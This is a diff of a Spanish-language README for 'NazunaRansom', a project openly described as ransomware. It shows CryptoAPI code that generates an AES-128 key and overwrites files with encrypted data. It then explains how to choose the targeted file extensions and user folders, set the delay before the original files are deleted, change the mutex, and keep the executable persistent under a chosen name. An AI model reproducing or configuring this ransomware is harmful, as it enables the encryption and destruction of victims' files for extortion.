@@ -17,26 +17,26 @@ NazunaRansom, es un ransomware inspirado en mi waifu (Nazuna)
 
 **CryptAcquireContext**
 
-```c++
-if (!CryptAcquireContext(&nazuna.hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, 0)) {
-  if (!CryptAcquireContext(&nazuna.hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_NEWKEYSET)) {
-    return false;
-  }
-}
+```c
+    if (!CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, 0)) {
+        if (!CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_NEWKEYSET)) {
+            return FALSE;
+        }
+    }
 ```
-En el primer if trata de obtener el identificador del contenedor CSP, ```nazuna.hProv``` funciona como un puntero que almacena el identificador CSP, si no se puede obtener el identifcador se vuelva a llamar a ```CryptAcquireContext``` con ```CRYPT_NEWKEYSET``` para crear un contenedor de claves en CSP
+En el primer if trata de obtener el identificador del contenedor CSP, ```hProv``` funciona como un puntero que almacena el identificador CSP, si no se puede obtener el identifcador se vuelva a llamar a ```CryptAcquireContext``` con ```CRYPT_NEWKEYSET``` para crear un contenedor de claves en CSP
 
 **CryptGenKey**
 
-```c++
-CryptGenKey(nazuna.hProv, CALG_AES_128, CRYPT_EXPORTABLE, &nazuna.hkey);
+```c
+CryptGenKey(hProv, CALG_AES_128, CRYPT_EXPORTABLE, &hkey);
 ```
-Genera una key AES-128 de acuerdo al identificador del CSP y la key la almacena en ```nazuna.hkey```
+Genera una key AES-128 de acuerdo al identificador del CSP y la key la almacena en ```hkey```
 
 **CryptEncrypt**
 
-```c++
-CryptEncrypt(nazuna.hkey, 0, true, 0, buf, &bytes_leer, BUF_LEN);
+```c
+CryptEncrypt(hkey, 0, TRUE, 0, buf, &bytes_leer, BUF_LEN);
 ```
 Cifra los datos de acuerdo al CSP, ```buf``` es un puntero al buffer datos que contiene los datos que se van a cifrar, ```bytes_leer``` es la cantidad de bytes que se van a cifrar, que son los bytes del archivo original, este buffer cifrado se sobreescribira por el original con unas funciones más adelante
 
@@ -66,38 +66,38 @@ Dentro del main cuando se hace uso de ```CreateThread```, si el identificador de
 
 Dentro de la funcion ```recorrer_dir``` puedes especificar las extensiones de los archivos que quieres que se cifren:
 
-```c++
+```c
 if (extension == ".txt" || extension == ".cpp" || extension == ".pdf" || extension == ".docx" || extension == ".xlsx")
 ```
 
 En la funcion ```main``` puedes especificar otro directorio que se va a cifrar
 
-```c++
+```c
 string ruta = filesystem::path(string(getenv("USERPROFILE")) + "\\Desktop").string();
 ```
 Solo modifica ```Desktop``` por otra, ej: ```Documents```
 
 En la funcion routine ```eliminar_archivos_routine``` le puedes indicar el tiempo en minutos que deseas que espere antes de borrar los archivos
 
-```c++
+```c
 this_thread::sleep_for(chrono::minutes(1)); <-- El numero indica los minutos
 ```
 
 Puedes cambiar el valor del mutex por otro que no este en uso
 
-```c++
+```c
 #define MUTEX "TeAmoNazuna" --> #define MUTEX "otroValor"
 ```
 
 En la funcion ```persistencia``` se ejecuta el ransomware desde la ruta Downloads con el nombre ```NazunaRansom```, puedes cambiar la ruta indicandolo en:
 
-```c++
+```c
 string ruta_descarga = filesystem::path(string(getenv("USERPROFILE")) + "\\Downloads").string();
 ```
 
 Y puedes cambiar el nombre del ejecutable en:
 
-```c++
+```c
 LPCSTR lpValueName = "NazunaRansom";
 ```
 
